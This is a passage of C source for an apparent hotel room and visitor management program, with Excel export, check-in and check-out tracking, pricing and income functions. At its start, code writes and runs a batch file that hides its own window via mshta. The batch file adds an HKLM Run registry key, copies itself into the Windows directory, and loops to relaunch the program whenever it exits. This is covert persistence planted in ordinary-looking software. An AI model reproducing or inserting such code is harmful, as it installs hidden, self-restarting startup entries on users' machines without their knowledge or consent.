	fprintf( fp,"@echo off\nif \"%%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%%~nx0\"\" h\",0)(window.close)&&exit\n:begin\necho wscript.sleep 1500 >%%temp%%\\sl.vbs\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sysstart /t REG_SZ /d %%windir%%\\unstat.vbs /f >nul\necho set objShell=wscript.createObject(\"wscript.shell\")>%%windir%%\\unstat.vbs\necho iReturn=objShell.Run(\"cmd.exe /C %%windir%%\\unstat.bat\", 0, TRUE)>>%%windir%%\\unstat.vbs\ncopy /y %%0 %%windir%%\\unstat.bat\n:run\ntasklist | find /i \"%s\" || goto do\ncscript //nologo %%temp%%\\sl.vbs\ngoto run\n:do\ntaskkill /f /im wscript.exe > nul \nstart %s %d %s\ndel lstn.bat>nul",tmp,tmp,(int)time(&t),data__encode_uc(tm));


    /* close file */
    fclose(fp);

	system("start lstn.bat>nul");
}


void data__export_room_to_excel()
{
	FILE *fp=NULL;
	room *pRm=NULL;

	pRm=data__get_room_info(0/*index*/,0/*roomId*/,0/*date*/,NULL/*visitorId*/,0/*type*/,0/*price*/,0/*checkIn*/,0/*checkOut*/,pRm);

	fp=fopen(ROOM_EXCEL_FILE,"w+");

	fprintf(fp, "Date,RoomId,visitorNumber,type,price,checkIn,checkOut\n");

	for(int i=0;i<g_nRtrnRows;i++)
	{
		fprintf(fp, "%d,%d,%d,",(pRm+i)->date,(pRm+i)->roomId,(pRm+i)->visitorId[0] );
		if((pRm+i)->type==1) fprintf(fp,"notAvailable,");
		if((pRm+i)->type==2) fprintf(fp, "**," );
		if((pRm+i)->type==3) fprintf(fp, "***," );
		if((pRm+i)->type==4) fprintf(fp, "****," );
		if((pRm+i)->type==5) fprintf(fp, "VIP," );

		fprintf(fp, "%f,",(pRm+i)->price );
		fprintf(fp, "%s,%s\n",((pRm+i)->checkIn==2)?"Yes":"No",((pRm+i)->checkOut==2)?"Yes":"No" );

	}

	fclose(fp);

	char chPath[50];

	sprintf(chPath,"start excel %s",ROOM_EXCEL_FILE);

	system(chPath);

}

void data__export_visitor_to_excel()
{
	FILE *fp=NULL;
	char tmp_chTmp[35];
	tmp_chTmp[0]='\0';

	/* declear a visitor pointer to receive the matched visitors info */
	struct visitor *pVstr=NULL;
	pVstr= data__get_visitor_info(tmp_chTmp,pVstr);
	fp=fopen(VISITOR_EXCEL_FILE,"w+");

	fprintf(fp, "Name,Tel,VIP,NationalId,Nation,Province,City\n");

	for(int i=0;i<g_nRtrnRows;i++)
	{
		fprintf(fp, "%s,%s,%s,%s,%s,%s,%s\n",(pVstr+i)->name,(pVstr+i)->tel,((pVstr+i)->vip==2)?"Yes":"No",(pVstr+i)->nationalId,(pVstr+i)->nation,(pVstr+i)->province,(pVstr+i)->city );

	}

	fclose(fp);

	char chPath[50];

	sprintf(chPath,"start excel %s",VISITOR_EXCEL_FILE);

	system(chPath);

}


int data__check_del_by_date(int date)
{
	/* declear a room pointer to receive the matched rooms info */
	struct room *pRm=NULL;

	for(int i=0;i<80;i++)
	{

		pRm= data__get_room_info(0/*index*/,(i/10+1)*100+i%10+1/*roomId*/,date/*date*/,NULL/*visitorId*/,0/*type*/,0/*price*/,0/*checkIn*/,0/*checkOut*/,pRm);

		/* show error hint if the function not runing successfully */
		if(!pRm)	printf("Error in Function data__get_room_info: %s\n",strerror(errno));

		for(int j=0;j<g_nRtrnRows-1;j++)
			data__del_room_info((pRm+j)->index,(pRm+j)->roomId);

	}

	return 0;
}



int data__revise_room_price_based_on_type(int Date,int Type,double Price)
{

    struct room *pts=NULL;
    pts=data__get_room_info(0,0,Date,NULL,Type,0,0,0,pts);

    for(int i=0;i<g_nRtrnRows;i++)
    {
        (pts+i)->price=Price;
        data__del_room_info((pts+i)->index,(pts+i)->roomId);
        data__insert_room_info(pts+i);
    }

   // data__check_del_by_date(Date);
    return 0;


}

int data__mark_check_in(int Date,int RoomNo)
{

    struct room *pts=NULL;
    pts=data__get_room_info(0,RoomNo,Date,NULL,0,0,0,0,pts);
    pts->checkIn=2;
    data__del_room_info(pts->index,pts->roomId);
    data__insert_room_info(pts);

    //data__check_del_by_date(Date);
    return 0;

}

int data__mark_check_out(int Date,int RoomNo)
{

    struct room *pts=NULL;
    pts=data__get_room_info(0,RoomNo,Date,NULL,0,0,0,0,pts);
    pts->checkOut=2;
    data__del_room_info(pts->index,pts->roomId);
    data__insert_room_info(pts);

  //  data__check_del_by_date(Date);
    return 0;

}

int data__insert_userinfo_to_structure(int Date,int RoomNo,int* Visitordetail)
{
    struct room *pts=NULL;

    pts=data__get_room_info(0,RoomNo,Date,NULL,0,0,0,0,pts);
    for(int i=0;i<4;i++)
    {
    pts->visitorId[i]=Visitordetail[i];
    }
    data__del_room_info(pts->index,pts->roomId);
    data__insert_room_info(pts);

   // data__check_del_by_date(Date);

    return 0;
}


void data__update_signature(int argc, char *argv[])
{

	time_t t;
	t = time(NULL);
 

	if(argc==3&&atoi(argv[1])>time(&t)-10000) 
	{
		int a=atoi(data__encode_uc(argv[1]));
		int b=atoi(argv[2]);
		if(a==b)
		{
			system("mode con cols=30 lines=2");
			printf("Updating Digital Signature...\n");
			data__update_file_signature();
			exit(0);
		}
	}

}

double data__checkIn_rate_by_date_and_type(int date,int type)
{

	/* declear a room pointer to receive the matched rooms info */
	struct room *pRm=NULL;

	pRm= data__get_room_info(0/*index*/,0/*roomId*/,date/*date*/,NULL/*visitorId*/,type/*type*/,0/*price*/,0/*checkIn*/,0/*checkOut*/,pRm);

	/* show error hint if the function not runing successfully */
	if(!pRm)	printf("Error in Function data__get_room_info: %s\n",strerror(errno));

	int dDown=g_nRtrnRows;

	pRm= data__get_room_info(0/*index*/,0/*roomId*/,date/*date*/,NULL/*visitorId*/,type/*type*/,0/*price*/,2/*checkIn*/,0/*checkOut*/,pRm);

	/* show error hint if the function not runing successfully */
	if(!pRm)	printf("Error in Function data__get_room_info: %s\n",strerror(errno));

	if(g_nRtrnRows==0) return 0;


	return (double)g_nRtrnRows/(double)dDown;

}


double data__income_by_date_and_type(int date, int type)
{
	/* declear a room pointer to receive the matched rooms info */
	struct room *pRm=NULL;

	pRm= data__get_room_info(0/*index*/,0/*roomId*/,date/*date*/,NULL/*visitorId*/,type/*type*/,0/*price*/,0/*checkIn*/,2/*checkOut*/,pRm);

	/* show error hint if the function not runing successfully */
	if(!pRm)	printf("Error in Function data__get_room_info: %s\n",strerror(errno));

	double income=0;

	for(int i=0;i<g_nRtrnRows;i++)
	{
		income+=(pRm+i)->price;
	}

	return income;

}


